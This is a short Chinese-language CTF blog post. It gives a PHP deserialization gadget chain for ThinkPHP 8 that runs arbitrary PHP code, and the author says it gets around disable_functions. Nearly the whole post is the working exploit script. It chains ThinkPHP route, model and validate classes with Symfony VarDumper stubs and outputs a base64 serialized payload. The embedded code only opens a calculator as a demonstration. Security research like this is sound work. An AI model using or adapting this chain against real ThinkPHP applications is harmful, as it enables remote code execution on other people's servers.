---
 title: Thinkphp8高版本反序列化链实现任意php代码执行
 date: 2024-10-7 12:00:00 +0800
 categories: [CTF, Thinkphp]
 tags: [Thinkphp反序列化链,php]
---

本身在Thinkphp框架模板渲染注入中可以实现eval执行任意命令

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410042308161.png)

参考:https://xz.aliyun.com/t/15591

为了和disabled_function说再见 重新写了Thinkphp8高版本的反序列化链实现任意代码执行,而不仅仅是命令执行RCE,可以适用于更多的复杂情况

```php
<?php
namespace Symfony\Component\VarDumper\Cloner;
class Stub
{
    public $value="<?php system('calc');?>";

}
namespace Symfony\Component\VarDumper\Caster;
use Symfony\Component\VarDumper\Cloner\Stub;
class ConstStub extends Stub
{

}

namespace think\view\driver;
class Php 
{

}



namespace think;
use think\view\driver\Php;
class Validate
{
    protected $type;
    public function __construct()
    {
        $this->type = ["visible"=>[new Php,"display"]];
    }
}

namespace think\model\concern;
use think\Model;

trait Conversion
{
    
}

namespace think;
use Symfony\Component\VarDumper\Caster\ConstStub;
abstract class Model 
{
    protected $append = ["J1rrY"=>["J1rrY"]];
    protected $visible;
    private $relation;
    public function __construct()
    {
        $this->relation = ["J1rrY"=>new Validate()];
        $this->visible = ["J1rrY"=>new ConstStub()];
    }
}


namespace think\model;
use think\Model;
class Pivot extends Model
{

}



namespace think\route;
use think\model\Pivot;
abstract class Rule
{
    
    protected $name="J1rrY";
    protected $rule="J1rrY";   
    protected $option;
    public function __construct()
    {
        $this->option= ["var"=>["J1rrY"=>new Pivot()]];
    }

}
namespace think\route;

class RuleGroup extends Rule
{

}

namespace think\route;
class Resource extends RuleGroup
{
    protected $rest = ["J1rrY"=>["J1rrY","<id>"]];
}
namespace think\route;
class ResourceRegister
{
    protected $resource;
    public function __construct()
    {
        $this->resource =new Resource();
    }
}
echo(base64_encode(serialize(new ResourceRegister())));
?>
```

![image.png](https://jerry-note-imgs.oss-cn-beijing.aliyuncs.com/imgs/202410042321997.png)

